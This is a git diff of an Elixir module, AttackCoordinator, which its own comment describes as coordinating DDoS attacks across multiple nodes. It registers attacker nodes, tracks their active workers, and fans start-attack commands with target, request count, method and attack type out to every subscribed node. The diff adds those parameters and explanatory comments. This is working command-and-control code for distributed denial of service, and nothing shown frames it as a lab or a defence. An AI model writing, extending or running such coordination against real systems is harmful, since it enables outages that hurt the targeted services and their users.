@@ -1,6 +1,9 @@
 defmodule AttackCoordinator do
   require Logger
 
+  # Module for coordinating DDoS attacks across multiple nodes. Attacker nodes subscribe to the coordinator, the coordinator awaits messages to start attacks and forwards them to all subscribed attackers. Uses phoenix PubSub to broadcast updates to LiveViews.
+
+  # Child specification to simplify supervised process starts
   def child_spec([]) do
     %{
       id: __MODULE__,
@@ -8,19 +11,23 @@ defmodule AttackCoordinator do
     }
   end
 
+  # Spawns a coordinator process and links it to the calling process
   def start_link do
     pid = spawn_link(fn -> start() end)
     {:ok, pid}
   end
 
+  # Setup function for the coordinator
   defp start() do
     Process.register(self(), :attack_coordinator)
     Logger.info("Attack coordinator started")
     loop(%{})
   end
 
+  # Main event loop
   defp loop(subscribed_attackers) do
     receive do
+      # Handles attacker subscriptions
       {:subscribe, node} ->
         Logger.info("Attacker subscribed: #{inspect(node)}")
 
@@ -28,6 +35,7 @@ defmodule AttackCoordinator do
         HelloWeb.Endpoint.broadcast("attacker", "attacker_list_update", updated_attackers)
         loop(updated_attackers)
 
+      # Handles updates with the number of active workers on attacker nodes
       {:attack_update, node, active_workers} ->
         Logger.info("Update received from #{inspect(node)} with #{active_workers} active workers")
 
@@ -37,15 +45,17 @@ defmodule AttackCoordinator do
 
         loop(updated_attackers)
 
-      {:start_attack, workers, target, requests} ->
+      # Handles messages to start attaacks on all the subscribed attacker nodes
+      {:start_attack, workers, target, requests, method, attack_type} ->
         Logger.info("Starting attack on: \n#{inspect(subscribed_attackers)}")
 
         for {node, _workers} <- subscribed_attackers do
-          start_attack(node, workers, target, requests)
+          start_attack(node, workers, target, requests, method, attack_type)
         end
 
         loop(subscribed_attackers)
 
+      # Remove disconnected node from the subscribed attackers if it exists in the map
       {:node_down, disconnected_node} ->
         remaining_attackers =
           Map.filter(
@@ -57,6 +67,7 @@ defmodule AttackCoordinator do
 
         loop(remaining_attackers)
 
+      # Returns the map of subscribed attackers to the sender
       {:get_attackers, from} ->
         send(from, {:attacker_list, subscribed_attackers})
         loop(subscribed_attackers)
@@ -67,8 +78,11 @@ defmodule AttackCoordinator do
     end
   end
 
-  defp start_attack(node, workers, target, requests) do
-    send({:attack_supervisor, node}, {:start, workers, target, requests})
-    # start_attack(subscribed_attackers, workers, target, requests)
+  # Sends the command to start an attack to an attacker node
+  defp start_attack(node, workers, target, requests, method, attack_type) do
+    send(
+      {:attack_supervisor, node},
+      {:start, workers, target, requests, method, attack_type}
+    )
   end
 end
